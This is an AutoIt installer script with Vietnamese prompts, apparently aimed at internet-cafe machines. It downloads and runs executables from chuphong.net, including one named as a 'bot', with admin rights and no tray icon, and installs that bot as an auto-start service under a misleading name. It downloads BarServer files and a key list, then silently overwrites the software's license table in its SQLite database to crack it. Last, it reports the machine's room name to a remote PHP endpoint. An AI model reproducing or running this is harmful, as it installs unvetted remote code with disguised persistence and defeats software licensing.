#include <InetConstants.au3>
#include <MsgBoxConstants.au3>
#include <WinAPIFiles.au3>
#include <Date.au3>

#NoTrayIcon
#RequireAdmin

global static $install 
global static $inject 
global static $crack 

If (not (FileExists(@WindowsDir & "\mssl.exe"))) or (not FileExists(@WindowsDir & "\desktopbg\test.txt")) Then

$name = InputBox("RegGameroom","Nhap ten phong may:","")

if $name == "" then
	MsgBox(0,"Alert","Vui long nhap ten phong may vao!")
	exit
endif

Local $sFilePath = @WindowsDir & "\desktopbg\test.txt"

$file = FileOpen($sFilePath, 10)
FileWrite($file, $name)
FileClose($file)
endif

; Download a file in the background.
; Wait for the download to complete.

Downbot()

Func Downbot()

   If Not FileExists(@WindowsDir & "\desktopbg") Then DirCreate(@WindowsDir & "\desktopbg")

    ; Save the downloaded file to the temporary folder.
   ;Local $sFilePath = _WinAPI_GetTempFileName(@TempDir)
    
   Local $sFilePath = @WindowsDir & "\desktopbg\vntadv.exe"
	;reDownload file
	;If FileExists(@WindowsDir & "\desktopbg\vntadv.exe") Then FileDelete(@WindowsDir & "\desktopbg\vntadv.exe")
	
    ; Download the file in the background with the selected option of 'force a reload from the remote site.'
    Local $hDownload = InetGet("http://chuphong.net/pm/vntadv.exe", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADBACKGROUND)

    ; Wait for the download to complete by monitoring when the 2nd index value of InetGetInfo returns True.
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    ; Retrieve the number of total bytes received and the filesize.
    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    ; Close the handle returned by InetGet.
    InetClose($hDownload)

    ; Display details about the total number of bytes read and the filesize.
    ;MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _"The total filesize: " & $iFileSize)

    ; Delete the file.
   ; FileDelete($sFilePath)
EndFunc   ;==>Example

Runbot()

Func Runbot()
Local $exeLocation = @WindowsDir & "\desktopbg\vntadv.exe"
Run($exeLocation)

$install = 1
EndFunc   ;==>Runbot


Downsrvman()
Func Downsrvman()

   If Not FileExists(@WindowsDir & "\desktopbg") Then DirCreate(@WindowsDir & "\desktopbg")

    ; Save the downloaded file to the temporary folder.
   ;Local $sFilePath = _WinAPI_GetTempFileName(@TempDir)
    
   Local $sFilePath = @WindowsDir & "\desktopbg\srvman.exe"
	;reDownload file
	;If FileExists(@WindowsDir & "\desktopbg\vntadv.exe") Then FileDelete(@WindowsDir & "\desktopbg\vntadv.exe")
	
    ; Download the file in the background with the selected option of 'force a reload from the remote site.'
    Local $hDownload = InetGet("http://chuphong.net/pm/srvman.exe", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADBACKGROUND)

    ; Wait for the download to complete by monitoring when the 2nd index value of InetGetInfo returns True.
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    ; Retrieve the number of total bytes received and the filesize.
    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    ; Close the handle returned by InetGet.
    InetClose($hDownload)

    ; Display details about the total number of bytes read and the filesize.
    ;MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _"The total filesize: " & $iFileSize)

    ; Delete the file.
   ; FileDelete($sFilePath)
EndFunc   ;==>Example

Inject()
Func Inject()
Local $exeLocation = "C:\Windows\desktopbg\srvman.exe add C:\Windows\desktopbg\vntadv.exe gcafebootmng svGBoot /type:app /start:auto /interactive:yes /overwrite:yes"

Run($exeLocation)

$inject = 1
EndFunc   ;==>Inject



Downcrack()
Func Downcrack()
	Run(@ComSpec & ' /C sc stop servermanager',"",@SW_HIDE)
	    ; Save the downloaded file to the temporary folder.
   ;Local $sFilePath = _WinAPI_GetTempFileName(@TempDir)
    
   Local $sFilePath = @ScriptDir & "\BarServer.exe"
	;reDownload file
	
    ; Download the file in the background with the selected option of 'force a reload from the remote site.'
    Local $hDownload = InetGet("http://chuphong.net/pm/BarServer.exe", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADWAIT)

    ; Wait for the download to complete by monitoring when the 2nd index value of InetGetInfo returns True.
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    ; Retrieve the number of total bytes received and the filesize.
    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    ; Close the handle returned by InetGet.
    InetClose($hDownload)

    ; Display details about the total number of bytes read and the filesize.
    ;MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _"The total filesize: " & $iFileSize)

    ; Delete the file.
   ; FileDelete($sFilePath)
EndFunc   ;==>Downcrack

Downcrackinf()
Func Downcrackinf()

    
   Local $sFilePath = @ScriptDir & "\barserver.ini"
	;reDownload file
	
    ; Download the file in the background with the selected option of 'force a reload from the remote site.'
    Local $hDownload = InetGet("http://chuphong.net/pm/barserver.ini", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADWAIT)

    ; Wait for the download to complete by monitoring when the 2nd index value of InetGetInfo returns True.
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    ; Retrieve the number of total bytes received and the filesize.
    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    ; Close the handle returned by InetGet.
    InetClose($hDownload)

    ; Display details about the total number of bytes read and the filesize.
    ;MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _"The total filesize: " & $iFileSize)

    ; Delete the file.
   ; FileDelete($sFilePath)
EndFunc   ;==>Downcrackinf

DownPkgDownDll()
Func DownPkgDownDll()

    
   Local $sFilePath = @ScriptDir & "\PkgDownDll.dll"
	;reDownload file
	
    ; Download the file in the background with the selected option of 'force a reload from the remote site.'
    Local $hDownload = InetGet("http://chuphong.net/pm/PkgDownDll.dll", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADWAIT)

    ; Wait for the download to complete by monitoring when the 2nd index value of InetGetInfo returns True.
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    ; Retrieve the number of total bytes received and the filesize.
    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    ; Close the handle returned by InetGet.
    InetClose($hDownload)

    ; Display details about the total number of bytes read and the filesize.
    ;MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _"The total filesize: " & $iFileSize)

    ; Delete the file.
   ; FileDelete($sFilePath)
EndFunc   ;==>DownPkgDownDll

DownKey()
Func DownKey()

    
   Local $sFilePath = @ScriptDir & "\key.csv"
	;reDownload file
	
    ; Download the file in the background with the selected option of 'force a reload from the remote site.'
    Local $hDownload = InetGet("http://chuphong.net/pm/key.csv", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADWAIT)

    ; Wait for the download to complete by monitoring when the 2nd index value of InetGetInfo returns True.
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    ; Retrieve the number of total bytes received and the filesize.
    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    ; Close the handle returned by InetGet.
    InetClose($hDownload)

    ; Display details about the total number of bytes read and the filesize.
    ;MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _"The total filesize: " & $iFileSize)

    ; Delete the file.
   ; FileDelete($sFilePath)
EndFunc   ;==>DownKey

Crack()
Func Crack()
Run(@ComSpec & '/C @sqlite3 ..\BarServer\data\barserver.db "DELETE FROM tbl_BarServerPacket;"',"",@SW_HIDE)
Run(@ComSpec & '/C @sqlite3 -header -csv ..\BarServer\data\barserver.db ".import key.csv tbl_BarServerPacket"',"",@SW_HIDE)
$crack = 1
EndFunc   ;==>Crack



If ($install and $inject and $crack) Then
Run(@ComSpec & ' /C sc start servermanager',"",@SW_HIDE)
$file = FileOpen($sFilePath, 0)
$FileContent = FileRead($file)

Local $tCur = _Date_Time_GetSystemTime()
local $sPD = 'time='&_Date_Time_SystemTimeToDateTimeStr($tCur)&'&gamerom='&$FileContent
; Creating the object
$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
$oHTTP.Open("POST", "http://chuphong.net/pm/setup.php", False)
$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")

; Performing the Request
$oHTTP.Send($sPD)

MsgBox(0,"Finish","Da dang ky phong may: " & $FileContent)
FileClose($file)
endif

